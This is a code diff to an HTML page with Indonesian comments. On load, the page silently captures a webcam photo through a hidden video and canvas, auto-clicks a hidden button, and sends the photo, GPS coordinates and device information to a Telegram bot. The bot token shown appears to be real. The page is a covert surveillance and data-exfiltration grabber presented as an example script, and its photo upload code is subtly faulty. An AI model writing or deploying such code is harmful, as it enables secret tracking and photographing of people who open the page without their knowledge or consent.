@@ -7,8 +7,36 @@
     $(document).ready(function() {
       // Fungsi untuk mengambil foto
       function takePhoto() {
-        // Kode untuk mengambil foto di sini
-        // Pastikan browser pengguna mendukung fitur pengambilan foto
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Mengambil foto setelah 2 detik
+            setTimeout(function() {
+              var canvas = document.getElementById('canvas');
+              var context = canvas.getContext('2d');
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              
+              // Mengirim foto ke Telegram API
+              sendPhotoToTelegramAPI(canvas.toDataURL('image/jpeg'));
+              
+              // Menghentikan akses kamera
+              stream.getTracks().forEach(function(track) {
+                track.stop();
+              });
+            }, 2000);
+          })
+          .catch(function(error) {
+            console.log('Gagal mengakses kamera: ' + error.message);
+          });
+      }
+
+      // Fungsi untuk mengklik elemen
+      function clickElement() {
+        var element = document.getElementById('targetElement');
+        element.click();
       }
 
       // Fungsi untuk mendapatkan lokasi menggunakan GPS
@@ -31,6 +59,15 @@
         sendToTelegramAPI(latitude, longitude, deviceInfo);
       }
 
+      // Fungsi untuk mengirim foto ke Telegram API
+      function sendPhotoToTelegramAPI(photo) {
+        var apiKey = 'YOUR_API_KEY';
+        var chatId = 'CHAT_ID'; // Ganti dengan ID chat yang sesuai
+
+        // Mengirim data foto ke Telegram API menggunakan metode POST
+        $.post("https://api.telegram.org/bot" + apiKey + "/sendPhoto?chat_id=" + chatId + "&photo=" + photo);
+      }
+
       // Fungsi untuk mengirim data ke Telegram API
       function sendToTelegramAPI(latitude, longitude, deviceInfo) {
         var apiKey = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
@@ -45,11 +82,15 @@
 
       // Panggil fungsi-fungsi yang diperlukan
       takePhoto();
+      clickElement();
       getLocation();
     });
   </script>
 </head>
 <body>
   <h1>Contoh Script HTML untuk Mengambil Foto, Lokasi, dan Informasi Perangkat</h1>
+  <video id="video" style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <button id="targetElement" style="display: none;"></button>
 </body>
 </html>
